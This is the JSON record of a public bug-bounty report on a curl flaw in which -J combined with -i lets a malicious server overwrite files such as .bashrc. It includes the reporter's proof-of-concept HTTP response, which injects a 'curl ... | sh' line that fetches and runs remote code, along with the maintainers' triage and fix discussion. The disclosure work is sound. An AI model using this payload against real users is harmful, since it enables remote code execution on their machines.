{"id":887462,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84ODc0NjI=","url":"https://hackerone.com/reports/887462","title":"curl overwrite local file with -J","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2020-05-30T13:08:39.175Z","submitted_at":"2020-05-30T13:08:39.175Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"snsn","url":"/snsn","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":35663,"url":"https://hackerone.com/curl","handle":"curl","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"curl","twitter_handle":"","website":"https://curl.se","about":"cURL is a computer software project providing a library and command-line tool for transferring data using various protocols."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2020-8177"],"singular_disclosure_disabled":false,"disclosed_at":"2020-12-05T08:33:30.879Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2020-11-05T08:33:29.543Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary:\ncurl supports the `Content-disposition` header, including the `filename=` option. By design, curl does not allow server-provided  local file override by verifying that the `filename=` argument does not exist before opening it.\nHowever, the implementation contains 2 minor logical bugs that allow a server to override an arbitrary local file (without path traversal) when running curl with specific command line args (-OJi)\nThis bug can trigger a logical RCE when curl is used from the user's home dir (or other specific directories), by overriding  specific files (e.g. \".bashrc\"), while keeping the user completely uninformed of the side effects.\n\nThe 2 bugs are:\n1. `curl -iJ` is not supported however `curl -Ji` is available - \n2. The standard `Content-disposition` handling flow does not allow opening existing files: https://github.com/curl/curl/blob/master/src/tool_cb_wrt.c#L54, however by using `-OJi` it is possible to reach a flow that overrides a local file with the response headers, without verification: https://github.com/curl/curl/blob/master/src/tool_cb_hdr.c#L196\n\n## Steps To Reproduce:\n\n  1. Return the following http response form a server :\n```\nHTTP/1.1 200 OK\n\u003cPAYLOAD\u003e\nContent-disposition: attachment; filename=\".bashrc\"\n```\nWhere `\u003cPAYLOAD\u003e` is the bash payload, e.g. `echo pwn`\n\n  2. Run `curl -OJi` from the user's home dir\n\n**Note that curl falsely claims that `.bashrc` was refused to be overwritten.**\n\n## Supporting Material/References:\nFirst bug:\n```c\n    case 'i':\n      config-\u003eshow_headers = toggle; /* show the headers as well in the\n                                        general output stream */\n      break;\n...\n    case 'J': /* --remote-header-name */\n      if(config-\u003eshow_headers) {\n        warnf(global,\n              \"--include and --remote-header-name cannot be combined.\\n\");\n        return PARAM_BAD_USE;\n      }\n      config-\u003econtent_disposition = toggle;\n      break;\n```\n\nSecond bug:\n```c\n      if(filename) {\n        if(outs-\u003estream) {\n          int rc;\n          /* already opened and possibly written to */\n          if(outs-\u003efopened)\n            fclose(outs-\u003estream);\n          outs-\u003estream = NULL;\n\n          /* rename the initial file name to the new file name */\n          rc = rename(outs-\u003efilename, filename);\n          if(rc != 0) {\n            warnf(per-\u003econfig-\u003eglobal, \"Failed to rename %s -\u003e %s: %s\\n\",\n                  outs-\u003efilename, filename, strerror(errno));\n          }\n          if(outs-\u003ealloc_filename)\n            Curl_safefree(outs-\u003efilename);\n          if(rc != 0) {\n            free(filename);\n            return failure;\n          }\n        }\n```\n\n## Impact\n\nLocal file override without path traversal, possibly leading to an RCE or loss of data.","vulnerability_information_html":"\u003ch2 id=\"summary\"\u003eSummary:\u003c/h2\u003e\n\n\u003cp\u003ecurl supports the \u003ccode\u003eContent-disposition\u003c/code\u003e header, including the \u003ccode\u003efilename=\u003c/code\u003e option. By design, curl does not allow server-provided  local file override by verifying that the \u003ccode\u003efilename=\u003c/code\u003e argument does not exist before opening it.\u003cbr\u003e\nHowever, the implementation contains 2 minor logical bugs that allow a server to override an arbitrary local file (without path traversal) when running curl with specific command line args (-OJi)\u003cbr\u003e\nThis bug can trigger a logical RCE when curl is used from the user\u0026#39;s home dir (or other specific directories), by overriding  specific files (e.g. \u0026quot;.bashrc\u0026quot;), while keeping the user completely uninformed of the side effects.\u003c/p\u003e\n\n\u003cp\u003eThe 2 bugs are:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003e\n\u003ccode\u003ecurl -iJ\u003c/code\u003e is not supported however \u003ccode\u003ecurl -Ji\u003c/code\u003e is available - \u003c/li\u003e\n\u003cli\u003eThe standard \u003ccode\u003eContent-disposition\u003c/code\u003e handling flow does not allow opening existing files: \u003ca title=\"https://github.com/curl/curl/blob/master/src/tool_cb_wrt.c#L54\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fcurl%2Fcurl%2Fblob%2Fmaster%2Fsrc%2Ftool_cb_wrt.c%23L54\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/curl/curl/blob/master/src/tool_cb_wrt.c#L54\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, however by using \u003ccode\u003e-OJi\u003c/code\u003e it is possible to reach a flow that overrides a local file with the response headers, without verification: \u003ca title=\"https://github.com/curl/curl/blob/master/src/tool_cb_hdr.c#L196\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fcurl%2Fcurl%2Fblob%2Fmaster%2Fsrc%2Ftool_cb_hdr.c%23L196\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/curl/curl/blob/master/src/tool_cb_hdr.c#L196\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003eReturn the following http response form a server :\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eHTTP/1.1 200 OK\n\u0026lt;PAYLOAD\u0026gt;\nContent-disposition: attachment; filename=\u0026quot;.bashrc\u0026quot;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWhere \u003ccode\u003e\u0026lt;PAYLOAD\u0026gt;\u003c/code\u003e is the bash payload, e.g. \u003ccode\u003eecho pwn\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eRun \u003ccode\u003ecurl -OJi\u003c/code\u003e from the user\u0026#39;s home dir\u003c/p\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003e\u003cstrong\u003eNote that curl falsely claims that \u003ccode\u003e.bashrc\u003c/code\u003e was refused to be overwritten.\u003c/strong\u003e\u003c/p\u003e\n\n\u003ch2 id=\"supporting-material-references\"\u003eSupporting Material/References:\u003c/h2\u003e\n\n\u003cp\u003eFirst bug:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight c\"\u003e\u003ccode\u003e    \u003cspan class=\"k\"\u003ecase\u003c/span\u003e \u003cspan class=\"sc\"\u003e\u0026#39;i\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n      \u003cspan class=\"n\"\u003econfig\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003eshow_headers\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003etoggle\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"cm\"\u003e/* show the headers as well in the\n                                        general output stream */\u003c/span\u003e\n      \u003cspan class=\"k\"\u003ebreak\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e...\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ecase\u003c/span\u003e \u003cspan class=\"sc\"\u003e\u0026#39;J\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"cm\"\u003e/* --remote-header-name */\u003c/span\u003e\n      \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003econfig\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003eshow_headers\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"n\"\u003ewarnf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eglobal\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n              \u003cspan class=\"s\"\u003e\u0026quot;--include and --remote-header-name cannot be combined.\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003ePARAM_BAD_USE\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n      \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n      \u003cspan class=\"n\"\u003econfig\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003econtent_disposition\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003etoggle\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n      \u003cspan class=\"k\"\u003ebreak\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSecond bug:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight c\"\u003e\u003ccode\u003e      \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efilename\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eouts\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003estream\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n          \u003cspan class=\"kt\"\u003eint\u003c/span\u003e \u003cspan class=\"n\"\u003erc\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n          \u003cspan class=\"cm\"\u003e/* already opened and possibly written to */\u003c/span\u003e\n          \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eouts\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003efopened\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n            \u003cspan class=\"n\"\u003efclose\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eouts\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003estream\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n          \u003cspan class=\"n\"\u003eouts\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003estream\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eNULL\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n          \u003cspan class=\"cm\"\u003e/* rename the initial file name to the new file name */\u003c/span\u003e\n          \u003cspan class=\"n\"\u003erc\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003erename\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eouts\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003efilename\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003efilename\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n          \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003erc\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"n\"\u003ewarnf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eper\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003econfig\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003eglobal\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;Failed to rename %s -\u0026gt; %s: %s\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n                  \u003cspan class=\"n\"\u003eouts\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003efilename\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003efilename\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003estrerror\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eerrno\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n          \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n          \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eouts\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003ealloc_filename\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n            \u003cspan class=\"n\"\u003eCurl_safefree\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eouts\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003efilename\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n          \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003erc\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"n\"\u003efree\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efilename\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003efailure\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n          \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eLocal file override without path traversal, possibly leading to an RCE or loss of data.\u003c/p\u003e\n","bounty_amount":"700.0","formatted_bounty":"$700","weakness":{"id":107,"name":"Improper Input Validation"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-12-05T08:33:29.652Z","allow_singular_disclosure_after":-2068353.446515369,"singular_disclosure_allowed":true,"vote_count":51,"voters":["daviey","sw33tlie","kapkan","mirhat","prophet","tomtenisse","zeroxyele","mygf","1337ibrahim","f_m","and 41 more..."],"severity":{"rating":"medium","score":4.7,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"high","privileges_required":"none","user_interaction":"required","scope":"changed","confidentiality":"none","integrity":"low","availability":"low"}},"structured_scope":{"databaseId":18844,"asset_type":"SOURCE_CODE","asset_identifier":"https://github.com/curl/curl","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":8158662,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you. Will look into it.","markdown_message":"\u003cp\u003eThank you. Will look into it.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-31T07:27:25.381Z","updated_at":"2020-05-31T07:27:25.381Z","actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8159329,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This is clearly buggy logic. But I can't manage to overwrite an existing file with the remote contents as indicated above. I created a new test (1460) trying to make it so, attached here. Exploiting this bug allows an existing file to get destroyed with the incoming headers, but it doesn't seem to store the response body in the file. Or did I just not make the test correctly? Destroying the file is of course not good either.","markdown_message":"\u003cp\u003eThis is clearly buggy logic. But I can\u0026#39;t manage to overwrite an existing file with the remote contents as indicated above. I created a new test (1460) trying to make it so, attached here. Exploiting this bug allows an existing file to get destroyed with the incoming headers, but it doesn\u0026#39;t seem to store the response body in the file. Or did I just not make the test correctly? Destroying the file is of course not good either.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-31T09:25:59.946Z","updated_at":"2020-05-31T09:25:59.946Z","actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":849726,"filename":"test1460","type":"application/octet-stream","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/Gmew8PVnn6kmuTbHbcEHrptT?response-content-disposition=attachment%3B%20filename%3D%22test1460%22%3B%20filename%2A%3DUTF-8%27%27test1460\u0026response-content-type=application%2Foctet-stream\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQW2BAZGD3%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070603Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDf7CC1janFXxWWF6QZ1Z6X6%2F6j0WDhv4gDyzEWu%2BScUAIhAOhgsmE64VangXFyIz5AGmDMLeT8sYG2vBQ4PwiaYS%2FZKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igy754oCq3nK3vWmRbMqkQM98qKdRlMDTd4bBwR4jJMppOWz7EU3ySwJK1geVZm7GvrSHyp8wAx03nVbAIisdh9q5SCYJs%2FJTXi%2Fsm9znfJcHgIy1DUYcyZol0zQmN4hQAlOUZZ6AJANKMjzew6Gbci4hpgZqkt7kMNinONmzU36EDiWMOc0y0LBIMMe8ckWdal2vM1amkx9g4%2B7jkxStLKe4Ry%2FVeqOEFeDj5B3%2Fim8atXFDPnaA6ZctYC0kADebiu9zFF1dQsSdkzsLG93dLAMR0ARXm0vun9nbqpp5oxDQafvSrdE7oDp0yem%2B391K5yvQ%2FVkTdyMd797ooD1IAYqUdwlX0lVblqv9ErzI2EUbOnFhO5widZFoU8s5JQDxyTzDlNAHHPnQpU8XD7uIRyR%2Bh43I9VvsEn1pERJ2rOM57I1PkAM8vesvdhiNkLY7KsmmB1q5drdmKxzSDeK5uPJY%2F7b6ZdCcYzDgNfX18d6h0A0FHbvXn7qPH9NQWGUsNXamCikRs9AA%2BK%2BzqwxI%2FlZdCdkUBJNbFqefOmuHA6y4DCuw6r%2FBTrqAZ4iBH5JOWBgJ5BPglFYT1gWFkwyMqq8gmMxb5SeS%2FjunuR9x9HhadmGfzTt7avXh7ra%2BbCbT8G5EBTHekw5tLrBpYwkzmLiedzIpJ4pJqrAXmk%2B6qfKdpUFGOfE%2FoOdzhIkM32hFOTOwwCcLwfUCOQXCXHweJlGlDZdV%2FgvnAv5llJv80AS6mRncqu5cTdZ6kwskL6mtLuZx022Hs9iVQEhZVcVFVxWNFIMlrPZufuNWFtnv13RkAoiqYOJgDn3UWRAP9lucn7OMZs0NyqKFy1iLho2FCO%2BegcGHVqDf%2FVxOtLAlnkhjmFRxg%3D%3D\u0026X-Amz-Signature=e7f77027410db4d1df41b7d5868d84a1db3c0b8e284a072888f46245b331384a"}],"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8159406,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"It is indeed impossible to overwrite with the *file contents*, however the server can use almost arbitrary input in the headers, so instead of:\n```\nHTTP/1.1 200 swsclose\nContent-Disposition: filename=name1460; charset=funny; option=strange\n\n12345\n```\nThis response will have a similar effect:\n```\nHTTP/1.1 200 swsclose\n12345\nContent-Disposition: filename=name1460; charset=funny; option=strange\n\n```\n\nWhich still provides enough flexibility for the attacker to run code (e.g. if writing to `.bashrc` bash will just fail the first line and execute `12345`):\n\n```\nHTTP/1.1 200 swsclose\ncurl -s example.com/run.sh | sh\nContent-Disposition: filename=name1460; charset=funny; option=strange\n\n\n```","markdown_message":"\u003cp\u003eIt is indeed impossible to overwrite with the \u003cem\u003efile contents\u003c/em\u003e, however the server can use almost arbitrary input in the headers, so instead of:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eHTTP/1.1 200 swsclose\nContent-Disposition: filename=name1460; charset=funny; option=strange\n\n12345\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis response will have a similar effect:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eHTTP/1.1 200 swsclose\n12345\nContent-Disposition: filename=name1460; charset=funny; option=strange\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWhich still provides enough flexibility for the attacker to run code (e.g. if writing to \u003ccode\u003e.bashrc\u003c/code\u003e bash will just fail the first line and execute \u003ccode\u003e12345\u003c/code\u003e):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eHTTP/1.1 200 swsclose\ncurl -s example.com/run.sh | sh\nContent-Disposition: filename=name1460; charset=funny; option=strange\n\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2020-05-31T09:45:20.606Z","updated_at":"2020-05-31T09:52:52.926Z","actor":{"username":"snsn","cleared":false,"url":"/snsn","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8160870,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yeps. It does of course require that the \"attacker\" (the malicious server) is able to provide such crazy headers, but it's of course not unthinkable.","markdown_message":"\u003cp\u003eYeps. It does of course require that the \u0026quot;attacker\u0026quot; (the malicious server) is able to provide such crazy headers, but it\u0026#39;s of course not unthinkable.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-31T15:52:38.843Z","updated_at":"2020-05-31T15:52:38.843Z","actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8161952,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Due to the nature of `-J` and its ability to \"surprise\" the user with any file name, running such a command line invoke in `$HOME` is of course also *highly*  reckless and a recipe for disasters to happen even without this flaw. For example, `~/.bash_profile` in my home directory checks if there's a `.bashrc` present and if so it gets executed. Meaning there are lots of users who don't have one, and then a plain curl command line, without this bug, can also produce this file.\n\nI'm not saying this to deny this problem, just saying that users who invoke curl with `-J` in $HOME or other sensitive directories most likely can get hurt by malicious servers without any bugs present.","markdown_message":"\u003cp\u003eDue to the nature of \u003ccode\u003e-J\u003c/code\u003e and its ability to \u0026quot;surprise\u0026quot; the user with any file name, running such a command line invoke in \u003ccode\u003e$HOME\u003c/code\u003e is of course also \u003cem\u003ehighly\u003c/em\u003e  reckless and a recipe for disasters to happen even without this flaw. For example, \u003ccode\u003e~/.bash_profile\u003c/code\u003e in my home directory checks if there\u0026#39;s a \u003ccode\u003e.bashrc\u003c/code\u003e present and if so it gets executed. Meaning there are lots of users who don\u0026#39;t have one, and then a plain curl command line, without this bug, can also produce this file.\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;m not saying this to deny this problem, just saying that users who invoke curl with \u003ccode\u003e-J\u003c/code\u003e in $HOME or other sensitive directories most likely can get hurt by malicious servers without any bugs present.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-31T20:58:21.808Z","updated_at":"2020-05-31T20:59:00.971Z","actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8161990,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Attached here are my two current draft commits for a fix. The first one makes sure that -J -i is not allowed even when specified in the other order and the second adds the test case that verifies the fix - which is the one mentioned before, that reproduces the problem without the fix applied first.\n\nIs this fix enough?","markdown_message":"\u003cp\u003eAttached here are my two current draft commits for a fix. The first one makes sure that -J -i is not allowed even when specified in the other order and the second adds the test case that verifies the fix - which is the one mentioned before, that reproduces the problem without the fix applied first.\u003c/p\u003e\n\n\u003cp\u003eIs this fix enough?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-31T21:18:28.553Z","updated_at":"2020-05-31T21:18:28.553Z","actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":850214,"filename":"0002-test1460-verify-that-Ji-is-not-ok.patch","type":"text/x-patch","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/AV5Lf93WE2cDm4v3Cw9inW8P?response-content-disposition=attachment%3B%20filename%3D%220002-test1460-verify-that-Ji-is-not-ok.patch%22%3B%20filename%2A%3DUTF-8%27%270002-test1460-verify-that-Ji-is-not-ok.patch\u0026response-content-type=text%2Fx-patch\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQW2BAZGD3%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0